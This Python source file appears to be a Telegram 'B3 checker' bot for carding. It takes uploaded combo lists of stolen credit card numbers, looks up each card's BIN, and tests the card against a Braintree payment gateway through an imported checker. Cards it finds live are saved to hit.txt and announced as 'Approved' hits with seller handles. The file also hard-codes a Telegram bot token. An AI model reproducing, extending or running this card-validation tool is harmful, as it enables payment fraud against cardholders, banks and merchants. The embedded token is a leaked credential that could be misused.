import requests,re
from hh import keep_alive
try:
    import telebot
except:
    import os
    os.system("pip install pyTelegramBotAPI")
from telebot import *
from GATEAU import Tele
from colorama import Fore
sto = {"stop":False}
token = "6525839179:AAFH1j8ZrSXjPnoZGzj6CGWHvtekSNTP0Pw" 
id =  1432366194
bot=telebot.TeleBot(token,parse_mode="HTML")
@bot.message_handler(commands=["stop"])
def start(message):
    sto.update({"stop":True})
    bot.reply_to(message,'👑𝐋𝐀𝐆𝐗𝐃 𝐁𝟑 𝐂𝐇𝐊
🚀𝐒𝐄𝐍𝐃 𝐂𝐎𝐌𝐁𝐎 𝐓𝐎 𝐂𝐇𝐊')
@bot.message_handler(commands=["start"])
def start(message):
 bot.send_message(message.chat.id,"👑𝐋𝐀𝐆𝐗𝐃 𝐁𝟑 𝐂𝐇𝐊
🚀𝐒𝐄𝐍𝐃 𝐂𝐎𝐌𝐁𝐎 𝐓𝐎 𝐂𝐇𝐊".format(message.chat.first_name),reply_markup=telebot.types.InlineKeyboardMarkup())
@bot.message_handler(content_types=["document"])
def main(message):
 first_name = message.from_user.first_name
 last_name = message.from_user.last_name
 name=f"{first_name} {last_name}"
 risk=0
 bad=0
 nok=0
 ok = 0
 ko = (bot.reply_to(message,f"#－ WELCOME {name} I WILL NOW START CHECK").message_id)
 ee=bot.download_file(bot.get_file(message.document.file_id).file_path)
 with open("combo.txt","wb") as w:
     w.write(ee)
 print(message.chat.id)
 sto.update({"stop":False})
 if message.chat.id == id:
   with open("combo.txt") as file:
       lino = file.readlines()
       lino = [line.rstrip() for line in lino]
       total = len(lino)
       for cc in lino:
           if sto["stop"] == False:
               pass
           else:
               break
           bin=cc[:6]
           url=f"https://lookup.binlist.net/{bin}"
           try:
           	req=requests.get(url).json()
           except:
           	pass
           try:
           	inf = req['scheme']
           except:
           	inf = "------------"
           try:
           	type = req['type']
           except:
           	type = "-----------"
           try:
           	brand = req['brand']
           except:
           	brand = '-----'
           try:
           	info = inf + '-' + type + '-' + brand
           except:
           	info = "-------"
           try:
           	ii = info.upper()
           except:
           	ii = "----------"
           try:
           	bank = req['bank']['name'].upper()
           except:
           	bank = "--------"
           try:
           	do = req['country']['name'] + ' ' + req['country']['emoji'].upper()
           except:
           	do = "-----------"
           mes = types.InlineKeyboardMarkup(row_width=1)
           GALD1 = types.InlineKeyboardButton(f"• {cc} •",callback_data='u8')
           #res = types.InlineKeyboardButton(f"• {last} •",callback_data='u1')
           GALD3 = types.InlineKeyboardButton(f"• 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ : [ {ok} ] •",callback_data='u2')
           GALD4 = types.InlineKeyboardButton(f"• 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌  : [ {bad} ] •",callback_data='u1')
           risk6 = types.InlineKeyboardButton(f"• 𝗥𝗜𝗦𝗞 🥲  : [ {risk} ] •",callback_data='u1')
           GALD5 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟 🔥  : [ {total} ] •",callback_data='u1')
           mes.add(GALD1,GALD3,GALD4,risk6,GALD5)
           bot.edit_message_text(chat_id=message.chat.id,message_id=ko,text=f'''HELLO {name}, PLEASE WAIT FOR CHECK COMBO AND SEND HIT.
    ''',parse_mode='markdown',reply_markup=mes)
           
           try:
             last = str(Tele(cc))
           except Exception as e:
               print(e)
               try:
                  last = str(Tele(cc))
               except Exception as e:
                  print(e)
                  bot.reply_to(message,f"CARD IS DEAD AND I SKIPPED >> {cc}")
           if "risk" in last:
           	risk += 1
           	print(Fore.YELLOW+cc+"->"+Fore.CYAN+last)
           elif "Insufficient Funds" in last:
               ok +=1
               respo = f'''
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝗖𝗖 ⇾ {cc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 0.01
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}

𝗕𝗬:@was_white
𝗖𝗛:@rarachk
±++++++++++++++++++++++++++++
اذا تم تغير حقوق يتم فصل عنك البوت وبدون ارجاع فلوسك
'''
               print(Fore.YELLOW+cc+"->"+Fore.GREEN+last)
               bot.reply_to(message,respo)
               with open("hit.txt", "a") as f:
               	f.write(f'''
±++++++++++++++++++++++++++++
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝗖𝗖 ⇾ {cc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 0.01
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}

𝗕𝗬:@feb2_0
𝗖𝗛:@rarachk
±++++++++++++++++++++++++++++
اذا تم تغير حقوق يتم فصل عنك البوت وبدون ارجاع فلوسك
±++++++++++++++++++++++++++++
''')
           elif "Status code avs: Gateway Rejected: avs" in last or "Nice! New payment method added:" in last or "Status code 81724: Duplicate card exists in the vault." in last:
               ok += 1
               respo = (f'''
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝗖𝗖 ⇾ {cc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 0.01
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
𝗕𝗬:@was_white
𝗖𝗛:@rarachl
±++++++++++++++++++++++++++++
اذا تم تغير حقوق يتم فصل عنك البوت وبدون ارجاع فلوسك
''')
               print(Fore.YELLOW+cc+"->"+Fore.GREEN+last)
               bot.reply_to(message,respo)
               with open("hit.txt", "a") as f:
               	f.write(f'''
±++++++++++++++++++++++++++++
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝗖𝗖 ⇾ {cc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 0.01
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Approved

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}

𝗕𝗬:@was_white
𝗖𝗛:@rarachk
±++++++++++++++++++++++++++++
اذا تم تغير حقوق يتم فصل عنك البوت وبدون ارجاع فلوسك
±++++++++++++++++++++++++++++
''')
           else:
                   bad +=1
                   print(Fore.YELLOW+cc+"->"+Fore.RED+last)
       if sto["stop"] == False:
           bot.reply_to(message,'تم فحص الكومبو كامل')
 else:
     bot.reply_to(message,'🏴‍☠️𝐏𝐕𝐓 𝐁𝐎𝐓
 \ 🔓𝐅𝐎𝐑 𝐀𝐂𝐂𝐄𝐒𝐒 @LAGXD')
keep_alive()
print("STARTED BOT @LAGXD ")
bot.infinity_polling()
